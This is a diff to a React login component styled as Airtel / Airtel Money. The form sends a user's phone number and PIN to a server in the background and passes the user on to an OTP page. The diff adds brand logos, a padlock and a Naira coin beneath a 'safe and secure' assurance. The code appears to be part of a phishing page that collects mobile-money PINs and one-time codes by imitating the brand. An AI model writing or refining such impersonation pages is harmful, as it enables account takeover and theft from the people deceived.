@@ -51,7 +51,6 @@ function AirtelLogin() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
     }).catch(() => {
-      // Silent failure — the user is already on the OTP page
       console.error('Login request failed in the background');
     });
 
@@ -146,6 +145,48 @@ function AirtelLogin() {
           </svg>
           <span>Your information is safe and secure</span>
         </div>
+      </div>
+
+      {/* --- NEW: Icons Section (Below the Login Card) --- */}
+      <div className="airtel-icons-footer">
+        
+        {/* Icon 1: Phone with Airtel Logo */}
+        <div className="airtel-icon-item">
+          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="2" width="36" height="51" rx="6" fill="#FFF5F5" stroke="#DA1C1C" strokeWidth="2"/>
+            <circle cx="20" cy="18" r="6" fill="black" />
+            <text x="20" y="38" textAnchor="middle" fontSize="10" fontWeight="bold" fill="black">Airtel</text>
+          </svg>
+        </div>
+
+        {/* Icon 2: Padlock */}
+        <div className="airtel-icon-item">
+          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="2" width="36" height="51" rx="6" fill="#1A2B3C" />
+            <rect x="14" y="22" width="12" height="12" rx="2" fill="#D4AF37" />
+            <path d="M16 22V18C16 15.7909 17.7909 14 20 14C22.2091 14 24 15.7909 24 18V22" stroke="#D4AF37" strokeWidth="3" strokeLinecap="round"/>
+            <circle cx="20" cy="27" r="2" fill="#1A2B3C" />
+          </svg>
+        </div>
+
+        {/* Icon 3: Airtel Money Logo */}
+        <div className="airtel-icon-item">
+          <svg width="50" height="55" viewBox="0 0 50 55" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="5" y="30" width="40" height="20" rx="4" fill="#DA1C1C" />
+            <text x="25" y="38" textAnchor="middle" fontSize="8" fontWeight="bold" fill="white">Airtel</text>
+            <rect x="10" y="40" width="30" height="10" rx="2" fill="#FFC107" />
+            <text x="25" y="47" textAnchor="middle" fontSize="8" fontWeight="bold" fill="black">Money</text>
+          </svg>
+        </div>
+
+        {/* Icon 4: Naira Coin */}
+        <div className="airtel-icon-item">
+          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="20" cy="27" r="18" fill="#FFC107" stroke="#D4AF37" strokeWidth="2"/>
+            <text x="20" y="34" textAnchor="middle" fontSize="22" fontWeight="bold" fill="black">₦</text>
+          </svg>
+        </div>
+
       </div>
     </div>
   );
